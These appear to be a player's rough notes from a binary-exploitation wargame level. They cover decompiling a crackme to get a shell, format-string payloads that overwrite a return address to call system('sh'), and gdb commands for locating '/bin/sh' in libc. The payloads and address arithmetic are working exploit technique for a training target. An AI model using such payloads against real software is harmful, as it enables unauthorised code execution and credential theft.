decompile the binary:
    - the binary read from input a number
    - sub this number from 0x1337d00d save result
    - compare result: result <= '0x15'
    - if true: call decrypt(result)
    - decrypt:
        - decrypt "Q}|u`sfg~sf{}|a3" with the result save it in hash.
        - compare hash == "Congratulations!"
        - if true: system("/bin/sh")
        - else print("error")
prepare:
    to call decrypt with the result we need to send a value with  0 <= 0x1337d00d - x <= 21
    so we have 21 number that make it easy to try to decrypt with all the 21 number
    then we found that 18 give us the result that we want.
     
exec bin:
    0x1337d00d - 18 = 322424827;
    - write 322424827 -> get sh prompt
    - cat /home/users/level04/.pass -> flag


0xf7e6aed0

000011112222%26727c%10$n%18013c%11$hn%18710c%12$hn
000011112222 | %10$p | %11$p | %12$p
python -c 'print "\x76\xd6\xff\xff\x74\xd6\xff\xff\x6c\xd6\xff\xff\x6e\xd6\xff\xff%2036c%10$n%32865c%11$hn%9835c%12$hn%18710c%13$hn"'


\x6c\xd6\xff\xff
\x6e\xd6\xff\xff
0x08048865 -> "sh"
0xffffd66c -> return address
0xffffd674 -> system() param address
0xf7e6aed0 -> system() address
0xf7e927c0 -> puts() address

0x0804 - 16     == 2036
0x8865 - 0x0804 == 32865
0xaed0 - 0x8865  == 9835
0xf7e6 - 0xaed0 == 18710

python -c 'print "\x74\xd6\xff\xff\x6c\xd6\xff\xff\x6e\xd6\xff\xff%10164c%11$n%16563c%10$hn%36726c%12$hn"'
0x27c0 - 12 == 10164
0x6873 - 0x27c0 == 16563
0xf7e9 - 0x6873 == 36726

set follow-fork-mode child
set detach-on-fork off
catch fork
b main
r

=========================================
https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb
gdb) info proc map
process 930
Mapped address spaces:

      Start Addr           End Addr       Size     Offset objfile
        0x400000           0x401000     0x1000        0x0 /myapp
        0x600000           0x601000     0x1000        0x0 /myapp
        0x601000           0x602000     0x1000     0x1000 /myapp
  0x7ffff7a1c000     0x7ffff7bd2000   0x1b6000        0x0 /usr/lib64/libc-2.17.so
  0x7ffff7bd2000     0x7ffff7dd2000   0x200000   0x1b6000 /usr/lib64/libc-2.17.so
  0x7ffff7dd2000     0x7ffff7dd6000     0x4000   0x1b6000 /usr/lib64/libc-2.17.so
  0x7ffff7dd6000     0x7ffff7dd8000     0x2000   0x1ba000 /usr/lib64/libc-2.17.so

(gdb) find 0x7ffff7a1c000,0x7ffff7bd2000,"sh"
0x7ffff7b98489
1 pattern found.
(gdb) x /s 0x7ffff7b98489
0x7ffff7b98489: "/bin/sh"
(gdb) x /xg 0x7ffff7b98489
0x7ffff7b98489: 0x0068732f6e69622f
